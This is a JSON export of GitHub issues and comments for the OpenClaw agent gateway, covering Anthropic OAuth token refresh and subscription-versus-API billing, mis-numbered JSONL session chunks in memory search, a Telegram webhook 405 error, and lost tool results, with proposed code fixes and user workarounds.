tier\n}\n\n// Validation strategy\nasync function ensureTokenValid(session: AnthropicOAuthSession) {\n  const hoursSinceValidation = (Date.now() - session.lastValidated) / 3600000;\n  \n  if (hoursSinceValidation > 24) {\n    // Re-validate token every 24 hours\n    const isValid = await validateToken(session.token);\n    if (!isValid) {\n      throw new Error('Anthropic OAuth token expired or revoked. Please re-authenticate.');\n    }\n    session.lastValidated = Date.now();\n  }\n}\n```\n\n---\n\n## 6. Error Handling\n\n### Common OAuth Token Errors\n\n```typescript\nfunction handleAnthropicError(error: any) {\n  if (error.status === 401) {\n    // Token invalid/expired\n    return {\n      error: 'oauth_token_invalid',\n      message: 'Claude OAuth token is invalid or expired. Please generate a new token at https://claude.ai',\n      action: 'reauthenticate'\n    };\n  }\n  \n  if (error.status === 429) {\n    // Rate limit (subscription tier dependent)\n    return {\n      error: 'rate_limit',\n      message: 'Claude subscription rate limit reached. Upgrade to Claude Max or wait.',\n      action: 'retry_later'\n    };\n  }\n}\n```\n\n---\n\n## 7. Benefits for Users\n\n### Why This Matters\n\n| Scenario | Cost |\n|----------|------|\n| **API Key** (`sk-ant-api03-`) | $15/1M input tokens, $75/1M output tokens |\n| **OAuth Token** (`sk-ant-oat01-`) | $0 (included in $20/month Claude Pro) |\n\n**Example Cost Savings:**\n- 1M tokens/month with API: ~$90\n- 1M tokens/month with Claude Pro OAuth: $20 (subscription)\n- **Savings: $70/month**\n\nFor heavy users, this is **substantial** cost reduction.\n\n---\n\n## 8. Implementation Checklist\n\n- [ ] Add token prefix detection (`oat01` vs `api03`)\n- [ ] Auto-set `type: \"oauth\"` for `oat01` tokens\n- [ ] Handle Anthropic OAuth in auth provider\n- [ ] Remove access/refresh/expires requirements for Anthropic OAuth\n- [ ] Add token validation endpoint call\n- [ ] Update `openclaw configure` wizard to explain token types\n- [ ] Add error handling for expired OAuth tokens\n- [ ] Document OAuth token generation process\n- [ ] Add billing mode indicator in UI/logs\n\n---\n\n## 9. Testing\n\n### Test Cases\n\n```bash\n# Test 1: OAuth token detection\ntoken=\"sk-ant-oat01-...\"\n# Expected: type=\"oauth\", accountType=\"subscription\"\n\n# Test 2: API key detection  \ntoken=\"sk-ant-api03-...\"\n# Expected: type=\"token\", billingMode=\"api-credits\"\n\n# Test 3: OAuth token usage\n# Expected: Successful API calls, no cooldown\n\n# Test 4: Token validation\n# Expected: 401 errors handled gracefully with re-auth prompt\n```\n\n---\n\n## 10. Documentation Needed\n\n### User Guide: Getting Claude OAuth Token\n\n```markdown\n## How to Use Claude Subscription (Free API Calls)\n\n1. Go to https://claude.ai\n2. Navigate to: Account Settings → Developer\n3. Click \"Create Token\"\n4. Copy token (starts with sk-ant-oat01-)\n5. Run: openclaw configure\n6. Paste token when prompted\n7. ✅ Now using Claude Pro/Max subscription instead of API credits!\n\n**Note:** Requires active Claude Pro ($20/mo) or Max ($200/mo) subscription.\n```\n\n---\n\n## 11. Related Issues\n\nThis would also fix:\n- Users accidentally using API credits when they have subscriptions\n- Confusion about token types\n- High API costs for existing Claude subscribers\n\n---\n\n## Summary\n\nThe implementation is **simpler than standard OAuth** because Anthropic uses session tokens, not JWT refresh flows. Main changes needed:\n\n1. Detect token prefix (`oat01` = OAuth)\n2. Handle as bearer token (already working)\n3. Remove access/refresh/expires requirements\n4. Add clear documentation\n\n**Estimated effort:** Small (few hours)  \n**User impact:** High (significant cost savings)  \n**Complexity:** Low (simpler than OpenAI OAuth)\n\ncc: @marc-niclas This would solve your issue and let you use your Claude subscription!"
        },
        {
          "id": 3853106563,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3853106563",
          "createdAt": "2026-02-05T11:44:51Z",
          "updatedAt": "2026-02-05T11:44:51Z",
          "author": "marc-niclas",
          "body": "> This will use Claude API credits instead of your Claude Pro/Max subscription, but it works reliably.\n\nYes but it also means I need to spend more money, instead of using my prepaid subscription 😭 \n\nI just don't understand what happened frankly. Because it was working. I don't even think I updated anything. Maybe my bot messed up the config 😅 \n\nI think this is being fixed in https://github.com/openclaw/openclaw/pull/8602"
        },
        {
          "id": 3856942059,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3856942059",
          "createdAt": "2026-02-05T23:20:20Z",
          "updatedAt": "2026-02-05T23:20:20Z",
          "author": "nikolasdehor",
          "body": "## Update: PR #8602 Will Fix This Issue\n\nGreat news! PR #8602 (https://github.com/openclaw/openclaw/pull/8602) implements exactly what we need:\n\n### What It Does\n1. ✅ **Auto-refresh Anthropic OAuth tokens** using `platform.claude.com/v1/oauth/token`\n2. ✅ **Syncs with Claude Code CLI Keychain** on macOS\n3. ✅ **Writes refreshed tokens back** to keep everything in sync\n4. ✅ **Keychain fallback** when refresh fails\n5. ✅ **Proper OAuth type handling** for `sk-ant-oat01-*` tokens\n\n### Current Status\n- PR is **open** (not merged yet)\n- All tests passing (208 tests including 10 new ones)\n- Ready to merge\n\n### Timeline\nOnce merged and released, users will be able to:\n- Use Claude Pro/Max subscription instead of API credits\n- Auto-refresh OAuth tokens without manual intervention\n- No more 401 errors with OAuth tokens\n\n@marc-niclas This PR should solve your issue! Once it's merged and in the next OpenClaw release, OAuth tokens will work properly.\n\n### Workaround Until Then\nContinue using API keys (`sk-ant-api03-*`) from https://console.anthropic.com/settings/keys"
        },
        {
          "id": 3861509803,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3861509803",
          "createdAt": "2026-02-06T16:53:11Z",
          "updatedAt": "2026-02-06T16:53:11Z",
          "author": "maxtongwang",
          "body": "> ## Update: PR #8602 Will Fix This Issue\n> \n> Great news! PR #8602 (https://github.com/openclaw/openclaw/pull/8602) implements exactly what we need:\n> \n> ### What It Does\n> 1. ✅ **Auto-refresh Anthropic OAuth tokens** using `platform.claude.com/v1/oauth/token`\n> 2. ✅ **Syncs with Claude Code CLI Keychain** on macOS\n> 3. ✅ **Writes refreshed tokens back** to keep everything in sync\n> 4. ✅ **Keychain fallback** when refresh fails\n> 5. ✅ **Proper OAuth type handling** for `sk-ant-oat01-*` tokens\n> \n> ### Current Status\n> - PR is **open** (not merged yet)\n> - All tests passing (208 tests including 10 new ones)\n> - Ready to merge\n> \n> ### Timeline\n> Once merged and released, users will be able to:\n> - Use Claude Pro/Max subscription instead of API credits\n> - Auto-refresh OAuth tokens without manual intervention\n> - No more 401 errors with OAuth tokens\n> \n> @marc-niclas This PR should solve your issue! Once it's merged and in the next OpenClaw release, OAuth tokens will work properly.\n> \n> ### Workaround Until Then\n> Continue using API keys (`sk-ant-api03-*`) from https://console.anthropic.com/settings/keys\n\nHi thanks. I don't know how the PR merge process is but all tests should have passed already.\n\nEveryone who's in need of this can also grab this change locally and start using your Claude subscription. Been running with this with no issues. "
        },
        {
          "id": 3863893267,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3863893267",
          "createdAt": "2026-02-07T07:53:26Z",
          "updatedAt": "2026-02-07T07:53:26Z",
          "author": "newcodebook",
          "body": "This issue looks covered by a CoClaw Troubleshooting Solution:\n\nhttps://coclaw.com/troubleshooting/solutions/models-all-models-failed/\n\nIf you try the steps and it still fails, please reply with:\n- your OS + OpenClaw version\n- relevant gateway logs (around the failure)\n- a minimal config snippet (redact secrets)"
        },
        {
          "id": 3864398928,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3864398928",
          "createdAt": "2026-02-07T12:17:11Z",
          "updatedAt": "2026-02-07T12:17:11Z",
          "author": "omdv",
          "body": "> This issue looks covered by a CoClaw Troubleshooting Solution:\n> \n> https://coclaw.com/troubleshooting/solutions/models-all-models-failed/\n\nIs this a joke or promotion of your website?"
        },
        {
          "id": 3871523567,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3871523567",
          "createdAt": "2026-02-09T12:49:59Z",
          "updatedAt": "2026-02-09T12:49:59Z",
          "author": "purplemonday-dev",
          "body": "@maxtongwang , I think  there is cancelled and skipped test. please check\nFix the macOS CI failure\n\n<img width=\"1265\" height=\"483\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/60b41c81-2a9f-400d-bae1-fc59a2cda52b\" />"
        },
        {
          "id": 3873637520,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3873637520",
          "createdAt": "2026-02-09T20:19:55Z",
          "updatedAt": "2026-02-09T20:19:55Z",
          "author": "nikolasdehor",
          "body": "## Update: Still broken on v2026.2.9\n\nJust updated to v2026.2.9 and the Anthropic OAuth authentication is **still failing with HTTP 401**.\n\n### Steps to reproduce\n\n1. Fresh `openclaw models auth login --provider anthropic` (reconfigured OAuth manually)\n2. New OAT token stored successfully: `sk-ant-oat01-cns4nPz...`\n3. Probe immediately returns:\n\n```\nanthropic/claude-opus-4-6 │ anthropic:default (token) │ auth · 994ms\n                          │ ↳ HTTP 401 authentication_error: Invalid bearer token\n                          │ (request_id: req_011CXy7QAf5vzwVy5YCb3GNW)\n```\n\n### What v2026.2.9 improved\n\n- Model failover now treats HTTP 400 errors as failover-eligible (#1879) — so at least when Anthropic 401s, it falls back to the next model instead of hanging\n- Auth now strips embedded line breaks from pasted tokens\n\n### What's still broken\n\n- The core issue: **OAT tokens (`sk-ant-oat01-*`) are not being refreshed automatically**. They expire quickly and OpenClaw doesn't renew them, so every manual OAuth configuration becomes invalid within hours\n- The only workaround is paying for an API key (`sk-ant-api03-*`) from console.anthropic.com, which defeats the purpose of OAuth\n\n### Impact\n\nThis has been open since early February. Users who rely on Anthropic models through OAuth are completely locked out. The fix in PR #8602 has been confirmed working by @newcodebook running it locally — can we get it merged?\n\nThe solution should be straightforward: implement token refresh for Anthropic OAT tokens, similar to how Google OAuth tokens are refreshed automatically via the `refresh` field in auth-profiles.json."
        },
        {
          "id": 3873673883,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3873673883",
          "createdAt": "2026-02-09T20:27:45Z",
          "updatedAt": "2026-02-09T20:27:45Z",
          "author": "maxtongwang",
          "body": "> [@maxtongwang](https://github.com/maxtongwang) , I think there is cancelled and skipped test. please check Fix the macOS CI failure\n> \n> <img alt=\"Image\" width=\"1265\" height=\"483\" src=\"https://private-user-images.githubusercontent.com/194777971/547093767-60b41c81-2a9f-400d-bae1-fc59a2cda52b.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzA2NjkwMjIsIm5iZiI6MTc3MDY2ODcyMiwicGF0aCI6Ii8xOTQ3Nzc5NzEvNTQ3MDkzNzY3LTYwYjQxYzgxLTJhOWYtNDAwZC1iYWUxLWZjNTlhMmNkYTUyYi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMjA5JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDIwOVQyMDI1MjJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0xNGI2ZTdmMDE4OGMyZGY1MzE3MmIzZWMyZmRiNmY5NDE0ZTg0M2ZlMDhmODc3ZTc2ZDRkZDI4ZTg1M2M1YzY4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.ExGac8CGlTM_ciGGY-mg8ZkhJlI9ph2jeORPibpO14E\">\n\nIt's very unclear how these tests are triggered or run against. I was hoping someone from openclaw would see and just check to merge this PR. Everyone could see my commit history there were attempts to fix these and they are just confusing. "
        },
        {
          "id": 3873962722,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3873962722",
          "createdAt": "2026-02-09T21:29:08Z",
          "updatedAt": "2026-02-09T21:29:08Z",
          "author": "maxtongwang",
          "body": "> [@maxtongwang](https://github.com/maxtongwang) , I think there is cancelled and skipped test. please check Fix the macOS CI failure\n> \n> <img alt=\"Image\" width=\"1265\" height=\"483\" src=\"https://private-user-images.githubusercontent.com/194777971/547093767-60b41c81-2a9f-400d-bae1-fc59a2cda52b.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzA2NzI4MjYsIm5iZiI6MTc3MDY3MjUyNiwicGF0aCI6Ii8xOTQ3Nzc5NzEvNTQ3MDkzNzY3LTYwYjQxYzgxLTJhOWYtNDAwZC1iYWUxLWZjNTlhMmNkYTUyYi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMjA5JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDIwOVQyMTI4NDZaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT05ZTM5ZjA4MTU2YjMxYWYzN2QxMWFiNmUzYTdlZGRkMDc1YWRiMTVkZDFkYjAwMWJjOTE4Zjc5ZDUzZDE1MWY2JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.egqEVkTUjMkAcPArqdtIJ_93tNNOUJXaX1nLRxs6iIc\">\n\nDid a few checks and I don't think these CIs have anything todo with my PR changes."
        },
        {
          "id": 3881382091,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3881382091",
          "createdAt": "2026-02-11T00:08:00Z",
          "updatedAt": "2026-02-11T00:08:00Z",
          "author": "PhelanShao",
          "body": "\n**Workaround that fixed it for me:**\n\nThe root cause in my case was a malformed `anthropic:default` token profile in `auth-profiles.json`. The token contained a `#` character (`sk-ant-oat01-...#yh9...`) — it looks like the OAuth `code#state` callback string was pasted directly as a token instead of being exchanged properly.\n\nThis `anthropic:default` profile was `type: \"token\"` (not `type: \"oauth\"`), so it had no automatic refresh mechanism and always returned HTTP 401. After enough failures, the entire provider entered cooldown.\n\n**Fix steps:**\n\n1. Remove the malformed `anthropic:default` profile from all agent `auth-profiles.json` files:\n   ```\n   ~/.clawdbot/agents/*/agent/auth-profiles.json\n   ```\n\n2. Clear cooldown/error stats for all anthropic profiles (set `errorCount: 0`, remove `cooldownUntil`).\n\n3. Update `lastGood.anthropic` to point to `anthropic:claude-cli` (the OAuth profile with a valid refresh token).\n\n4. Remove the `anthropic:default` entry from `openclaw.json` → `auth.profiles`.\n\n5. Restart the gateway:\n   ```bash\n   openclaw gateway restart\n   ```\n\nAfter this, all agents correctly use the `anthropic:claude-cli` OAuth profile which supports automatic token refresh. Expired tokens on secondary agents were automatically inherited from the main agent.\n\n**Key takeaway:** If you used `paste-token` and accidentally pasted the full `code#state` string from the OAuth callback, it creates a broken token profile that will never work and blocks the entire provider. The fix is to delete that profile and rely on the proper OAuth (`type: \"oauth\"`) profile with refresh token support.\n\n"
        },
        {
          "id": 3881398267,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9095#issuecomment-3881398267",
          "createdAt": "2026-02-11T00:12:22Z",
          "updatedAt": "2026-02-11T00:12:22Z",
          "author": "maxtongwang",
          "body": "> **Workaround that fixed it for me:**\n> \n> The root cause in my case was a malformed `anthropic:default` token profile in `auth-profiles.json`. The token contained a `#` character (`sk-ant-oat01-...#yh9...`) — it looks like the OAuth `code#state` callback string was pasted directly as a token instead of being exchanged properly.\n> \n> This `anthropic:default` profile was `type: \"token\"` (not `type: \"oauth\"`), so it had no automatic refresh mechanism and always returned HTTP 401. After enough failures, the entire provider entered cooldown.\n> \n> **Fix steps:**\n> \n> 1. Remove the malformed `anthropic:default` profile from all agent `auth-profiles.json` files:\n>    ```\n>    ~/.clawdbot/agents/*/agent/auth-profiles.json\n>    ```\n> 2. Clear cooldown/error stats for all anthropic profiles (set `errorCount: 0`, remove `cooldownUntil`).\n> 3. Update `lastGood.anthropic` to point to `anthropic:claude-cli` (the OAuth profile with a valid refresh token).\n> 4. Remove the `anthropic:default` entry from `openclaw.json` → `auth.profiles`.\n> 5. Restart the gateway:\n>    openclaw gateway restart\n> \n> After this, all agents correctly use the `anthropic:claude-cli` OAuth profile which supports automatic token refresh. Expired tokens on secondary agents were automatically inherited from the main agent.\n> \n> **Key takeaway:** If you used `paste-token` and accidentally pasted the full `code#state` string from the OAuth callback, it creates a broken token profile that will never work and blocks the entire provider. The fix is to delete that profile and rely on the proper OAuth (`type: \"oauth\"`) profile with refresh token support.\n\nhttps://github.com/openclaw/openclaw/pull/8602"
        }
      ]
    },
    {
      "number": 12044,
      "title": "Session file (JSONL) chunks have incorrect line numbers — `memory_search` returns wrong source locations",
      "body": "When session files (JSONL) are indexed for semantic search, the chunk `start_line` and `end_line` values reference positions in an intermediate transformed text, not the original file. This makes line numbers returned by `memory_search` meaningless for source navigation.\n\n**Note:** `memory_get` is already blocked for JSONL files (only `.md` supported), so drill-down to sessions isn't currently possible regardless. This bug would block any future implementation of JSONL drill-down, and causes confusion when users try to correlate search results with source files.\n\n### Environment\n\n- OpenClaw version: 2026.1.30\n- Node.js: v22.22.0\n- OS: Linux (x64)\n\n## Root Cause\n\nSession files undergo transformation before chunking:\n\n```\nsession.jsonl (JSONL records)\n    ↓\nbuildSessionEntry() extracts text → \"User: ...\\nAssistant: ...\"\n    ↓\nchunkMarkdown() assigns line numbers → based on flattened text\n    ↓\nDatabase stores chunks with wrong line numbers\n```\n\nThe line numbers stored reference positions in the flattened \"User: ...\\nAssistant: ...\" text, not the original JSONL file.\n\n### Evidence\n\n**Database chunk:** `start_line: 4, end_line: 6`\n\n**Actual JSONL lines 4-6:**\n```json\n{\"type\":\"custom\",\"customType\":\"model-snapshot\",...}\n{\"type\":\"custom\",\"customType\":\"openclaw.cache-ttl\",...}\n{\"type\":\"message\",...}\n```\nThese are metadata/header records, not conversation text.\n\n**Grep for chunk text:**\n```bash\n$ grep -n \"friendly gremlin\" session.jsonl\n13:{\"type\":\"message\",...,\"text\":\"...friendly gremlin energy...\"}\n```\nThe actual content is on line 13, not 4-6.\n\n**Flattened text lines 4-6:**\n```\nLine 4: Assistant: Thanks! It's... weird?...\nLine 5: User: You may call me big buddy. 😂\nLine 6: Assistant: Big Buddy it is! ...friendly gremlin energy...\n```\nThe line numbers make sense for the flattened text, but that's not what users have access to.\n\n## Impact\n\n| Area | Status |\n|------|--------|\n| Semantic search | ✅ Works — text content is correct |\n| Search result text | ✅ Works — snippets contain real content |\n| Line number accuracy | ❌ Broken — references wrong positions |\n| `memory_get` for JSONL | ⬛ Already blocked at API level |\n| Future JSONL drill-down | ❌ Would be blocked until fixed |\n| Markdown files | ✅ Unaffected — chunked from source directly |\n\n**Severity: Medium** — Search works, but source navigation is broken. Primarily affects debugging/auditing and blocks potential future features.\n\n## Proposed Fix\n\nTrack original JSONL line numbers through the transformation:\n\n**1. `manager.js:buildSessionEntry()` (~line 1350):**\n```javascript\nasync buildSessionEntry(absPath) {\n    // ... existing setup ...\n    const collected = [];\n    const lineMap = [];  // NEW\n    \n    for (let jsonlLineNo = 0; jsonlLineNo < lines.length; jsonlLineNo++) {\n        const line = lines[jsonlLineNo];\n        // ... existing filtering ...\n        \n        const label = message.role === \"user\" ? \"User\" : \"Assistant\";\n        collected.push(`${label}: ${text}`);\n        lineMap.push(jsonlLineNo + 1);  // NEW: 1-indexed original line\n    }\n    \n    return {\n        // ... existing fields ...\n        lineMap,  // NEW\n    };\n}\n```\n\n**2. `manager.js:syncSessionFiles()` (~line 966):**\n```javascript\nawait this.indexFile(entry, { \n    source: \"sessions\", \n    content: entry.content,\n    lineMap: entry.lineMap  // NEW\n});\n```\n\n**3. `manager.js:indexFile()` (~line 2020):**\n```javascript\n// After chunkMarkdown() call, before database insertion:\nif (options.lineMap && options.source === 'sessions') {\n    for (const chunk of chunks) {\n        chunk.startLine = options.lineMap[chunk.startLine - 1] ?? chunk.startLine;\n        chunk.endLine = options.lineMap[chunk.endLine - 1] ?? chunk.endLine;\n    }\n}\n```\n\n**Scope:** ~35-45 lines changed, no schema changes, no breaking changes.\n\n**Note:** Changing line numbers will change chunk IDs (they include line numbers in the hash). This triggers full re-embedding on next `--force` reindex. Minimal API cost.\n\n## Note on File Location\n\nOur investigation found that `session-files.js:buildSessionEntry()` is dead code — the manager has its own internal copy at `manager.js:1350`. Only the manager version is actually called. Happy to provide full trace if helpful.\n\n## Questions for Maintainers\n\n1. Is there a reason `memory_get` blocks JSONL files? Would enabling it be a separate enhancement?\n2. Should chunk IDs avoid line numbers to prevent re-embedding on metadata-only changes?\n3. Is there interest in a PR, or would you prefer to implement internally?\n\n---\n\n*Investigation details available on request.*",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12044",
      "createdAt": "2026-02-08T19:24:32Z",
      "updatedAt": "2026-02-11T00:09:26Z",
      "author": "EschatBot",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 4417,
      "title": "Telegram webhook returns 405 Method Not Allowed",
      "body": "## Description\n\nTelegram webhook mode returns `405 Method Not Allowed` when Telegram tries to POST to the webhook endpoint.\n\n## Setup\n\n- OpenClaw version: 2026.1.29 (commit 87267fad4)\n- Tailscale funnel mode enabled\n- Webhook URL: `https://<hostname>.ts.net/telegram-webhook`\n\n## Steps to Reproduce\n\n1. Configure Telegram webhook:\n```json\n{\n  \"gateway\": { \"tailscale\": { \"mode\": \"funnel\" } },\n  \"channels\": {\n    \"telegram\": {\n      \"webhookUrl\": \"https://<hostname>.ts.net/telegram-webhook\"\n    }\n  }\n}\n```\n\n2. Gateway logs show: `webhook listening on https://<hostname>.ts.net/telegram-webhook`\n\n3. Send a Telegram message to the bot\n\n4. Check webhook status:\n```bash\ncurl -s \"https://api.telegram.org/bot<token>/getWebhookInfo\" | jq\n```\n\n## Expected Behavior\n\nTelegram webhook should receive POST requests and process messages.\n\n## Actual Behavior\n\nTelegram reports:\n```json\n{\n  \"last_error_message\": \"Wrong response from the webhook: 405 Method Not Allowed\"\n}\n```\n\nTesting the endpoint manually also returns 405:\n```bash\ncurl -X POST -H \"Content-Type: application/json\" -d '{\"test\":true}' https://<hostname>.ts.net/telegram-webhook\n# Returns: Method Not Allowed\n```\n\n## Workaround\n\nUsing long-polling mode (no webhookUrl) works correctly with ~7-15 second latency.\n\n## Environment\n\n- OS: Linux (WSL2)\n- Node: 24.12.0\n- Tailscale: funnel mode active and verified working for other endpoints\n\n## Notes\n\nThe gateway root URL (`/`) responds correctly, and the webhook endpoint is registered in logs, but POST requests are rejected with 405.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4417",
      "createdAt": "2026-01-30T06:14:38Z",
      "updatedAt": "2026-02-11T00:04:57Z",
      "author": "taolong75",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "windows",
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881373569,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4417#issuecomment-3881373569",
          "createdAt": "2026-02-11T00:04:57Z",
          "updatedAt": "2026-02-11T00:04:57Z",
          "author": "psdkumar",
          "body": "Facing same issue with 2026.2.9 version as well."
        }
      ]
    },
    {
      "number": 13351,
      "title": "[Bug]: Tool call results intermittently lost - 'missing tool result in session history'",
      "body": "## Bug Description\n\nTool call results are intermittently lost during normal agent operation. The system inserts a synthetic error result with the message:\n\n```\n[openclaw] missing tool result in session history; inserted synthetic error result for transcript repair\n```\n\nThis causes the agent to silently fail to respond, requiring the user to repeat their message.\n\n## Environment\n\n- **OpenClaw version**: 2026.2.9\n- **OS**: macOS (Apple Silicon)\n- **Channel**: Telegram\n- **Model**: Various (observed with both gemini-3-flash and claude-opus-4-6-thinking)\n\n## Steps to Reproduce\n\n1. Use any tool (exec, read, web_fetch, etc.) during normal conversation\n2. Intermittently, the tool result is not written back to the session history\n3. The system inserts a synthetic error result instead of the actual tool output\n4. The agent stalls and does not respond to the user\n\n## Frequency\n\nOccurs multiple times per session (observed ~8-10 times in a single conversation session). Not tied to any specific tool — affects `exec`, `read`, `web_fetch`, `gateway`, and others.\n\n## Expected Behavior\n\nTool results should always be correctly persisted to session history and returned to the agent.\n\n## Actual Behavior\n\nTool results are silently dropped. The session history repair mechanism inserts a generic error, causing the agent to either:\n- Fail silently (no response to user)\n- Need to retry the tool call\n\n## Additional Context\n\n- The issue may be related to context compaction or session history management\n- Ironically, this bug also prevented the agent from filing this bug report on the first attempt (web_fetch to GitHub issues page also failed with the same error)\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13351",
      "createdAt": "2026-02-10T11:38:52Z",
      "updatedAt": "2026-02-11T00:03:50Z",
      "author": "hotejb",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3881370439,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13351#issuecomment-3881370439",
          "createdAt": "2026-02-11T00:03:50Z",
          "updatedAt": "2026-02-11T00:03:50Z",
          "author": "rodbland2021",
          "body": "We've traced the root cause of this bug — see our comment on #8643 and our fix in #13746.\n\n**TL;DR:** pi-agent-core's auto-retry resolves `waitForRetry()` on assistant message receipt, before tool execution completes. The attempt's `finally` block then flushes pending tool calls as synthetic errors before they ever run. Our fix adds `waitForIdle()` before the flush.\n\nCurrently testing on a production VPS."
        }
      ]
    },
    {
      "number": 8643,
      "title": "[Bug]: Intermittent \"missing tool result in session history\" errors",
      "body": "**Summary**\nTool calls intermittently fail with [openclaw] missing tool result in session history; inserted synthetic error result for transcript repair. — the agent receives no output and the reply stalls until the user sends a follow-up message.\n\n**Steps to reproduce**\n1. Run OpenClaw with google-antigravity/claude-opus-4-5-thinking model via Telegram\n2. Have an active conversation with multiple tool calls (e.g., exec, cron, gateway)\n3. Observe that ~5-10% of tool calls return the synthetic error instead of actual results\n4. Note: failures can cluster (2-3 consecutive failures observed)\n\n**Expected behavior**\nTool calls should return their actual output, allowing the agent to continue the conversation.\n\n**Actual behavior**\nTool calls sporadically return:\n\n[openclaw] missing tool result in session history; inserted synthetic error result for transcript repair.The agent cannot proceed and goes silent. Retrying the same tool call (after user nudge) usually succeeds.\n\n**Environment**\n• OpenClaw version: 2026.2.2-3\n• OS: Linux 6.14.0-37-generic (x64), Node v22.22.0\n• Install method: npm (global)\n\n**Logs or screenshots**\nNo errors appear in journalctl --user -u openclaw-gateway at the time of failure. The error message appears inline in the tool result payload. Frequency seems higher around gateway restarts but also occurs during normal operation.\n",
      "state": "open",
      "comments": 4,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/8643",
      "createdAt": "2026-02-04T07:32:41Z",
      "updatedAt": "2026-02-11T00:03:44Z",
      "author": "Thyless",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3846946752,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8643#issuecomment-3846946752",
          "createdAt": "2026-02-04T11:41:01Z",
          "updatedAt": "2026-02-04T11:41:01Z",
          "author": "wgarunap",
          "body": "I am having the same issue now in my Macbook, Once context is reset agent starts to work again. But would be nice to fix asap as this looses the previous context."
        },
        {
          "id": 3848829422,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8643#issuecomment-3848829422",
          "createdAt": "2026-02-04T17:41:30Z",
          "updatedAt": "2026-02-04T17:49:20Z",
          "author": "Shaharsha",
          "body": "### Additional data point: Permanent session corruption with `web_search` tool\n\nI experienced a similar but **more severe variant** of this issue on `2026.2.2-3` — the session became **permanently corrupted**, not intermittently failing.\n\n**Error:**\n```\nLLM request rejected: messages.617: `tool_use` ids were found without `tool_result` blocks immediately after: web_search_1770224080027_3. Each `tool_use` block must have a corresponding `tool_result` block in the next message.\n```\n\n**Key differences from the intermittent case:**\n- **Tool:** `web_search` (Perplexity), not shell/process tools\n- **Severity:** Every subsequent message failed with the same error — permanent, not intermittent\n- **Recovery:** Required manual deletion of the session transcript (`.jsonl`) and entry from `sessions.json`. The session did NOT self-recover.\n\n**Timeline:**\n1. Asked the agent to search for weather/wind forecast (via WhatsApp)\n2. Agent successfully responded with the forecast (web_search worked)\n3. Shortly after, a skill update message was sent\n4. Every message after that returned the `tool_use`/`tool_result` mismatch error\n5. Gateway restarts did not help\n6. Manual session deletion was required to restore functionality\n\n**Environment:**\n- OpenClaw: `2026.2.2-3`\n- OS: Linux 6.8.0-90-generic (x64)\n- Channel: WhatsApp\n- Model: `claude-opus-4-5`\n- Tool: `web_search` (Perplexity provider)\n\n**Speculation:**\nThe `web_search` tool call may have timed out or been interrupted mid-flight (possibly during the skill update?), leaving an orphaned `tool_use` block in the transcript. The repair mechanism from PR #7473 (\"repair malformed tool calls and session transcripts\") did not catch this case.\n\n**Workaround:**\n```bash\n# Stop gateway\nsystemctl --user stop openclaw-gateway\n\n# Delete the corrupted session transcript\nrm ~/.openclaw/agents/main/sessions/<session-id>.jsonl\n\n# Remove from sessions.json (using jq)\njq 'del(.\"agent:main:main\")' 